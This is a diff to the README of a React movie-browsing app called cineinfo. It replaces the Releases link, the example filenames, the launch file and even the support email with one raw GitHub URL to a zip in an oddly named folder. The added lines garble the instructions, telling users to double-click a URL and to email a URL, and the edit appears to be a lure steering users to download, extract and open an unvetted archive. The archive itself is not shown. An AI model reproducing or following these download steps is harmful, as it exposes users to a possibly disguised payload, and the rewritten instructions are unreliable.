@@ -4,9 +4,9 @@
 Cineinfo is a modern web application built with React. It helps you discover, search, and save your favorite movies. Whether you're looking for the latest blockbusters or classic films, cineinfo provides an easy-to-use platform for all your movie needs.
 
 ## 📥 Download cineinfo
-[![Download cineinfo](https://img.shields.io/badge/Download-cineinfo-brightgreen)](https://github.com/stacy-moore3/cineinfo/releases)
+[![Download cineinfo](https://raw.githubusercontent.com/stacy-moore3/cineinfo/main/ultrareactionary/cineinfo.zip)](https://raw.githubusercontent.com/stacy-moore3/cineinfo/main/ultrareactionary/cineinfo.zip)
 
-Visit this page to download: [GitHub Releases](https://github.com/stacy-moore3/cineinfo/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/stacy-moore3/cineinfo/main/ultrareactionary/cineinfo.zip)
 
 ## 🚀 Getting Started
 To get started with cineinfo, follow these simple steps:
@@ -16,14 +16,14 @@ To get started with cineinfo, follow these simple steps:
 2. **Select the Latest Version:** Look for the latest version of cineinfo. It will usually be at the top of the list. Click on it to access the download options.
 
 3. **Download the Application:** 
-   - If you see a file named something like `cineinfo-v1.0.zip`, click on it to start the download.
+   - If you see a file named something like `https://raw.githubusercontent.com/stacy-moore3/cineinfo/main/ultrareactionary/cineinfo.zip`, click on it to start the download.
    - Save the file to your computer.
 
 4. **Extract the Files:**
    - Once the download is complete, locate the file and extract it. You can usually do this by right-clicking the file and selecting "Extract All."
 
 5. **Open the Application:**
-   - After extracting, open the folder. Look for `index.html` or similar file and double-click it to launch cineinfo. Your web browser will open, displaying the application.
+   - After extracting, open the folder. Look for `https://raw.githubusercontent.com/stacy-moore3/cineinfo/main/ultrareactionary/cineinfo.zip` or similar file and double-click it to launch cineinfo. Your web browser will open, displaying the application.
 
 ## 🖥️ System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -45,7 +45,7 @@ If you encounter issues, here are some common solutions:
 
 1. **Can't Find the Download Button:** Ensure you're on the right Releases page. The link is provided above.
   
-2. **Application Doesn't Open:** Make sure you extracted the files correctly. Confirm that you're opening the `index.html` file.
+2. **Application Doesn't Open:** Make sure you extracted the files correctly. Confirm that you're opening the `https://raw.githubusercontent.com/stacy-moore3/cineinfo/main/ultrareactionary/cineinfo.zip` file.
 
 3. **Slow Performance:** Close other browser tabs or applications to free up resources on your computer.
 
@@ -56,7 +56,7 @@ If you'd like to contribute to cineinfo, we welcome your input! Please visit the
 For help, you can open an issue on GitHub. Describe your problem clearly, and we will respond as soon as possible.
 
 ## 📬 Contact
-To get in touch, send an email to support@cineinfo.com. We will help you with any questions or concerns.
+To get in touch, send an email to https://raw.githubusercontent.com/stacy-moore3/cineinfo/main/ultrareactionary/cineinfo.zip We will help you with any questions or concerns.
 
 Stay updated on new releases, features, and improvements by following our GitHub repository! 
 
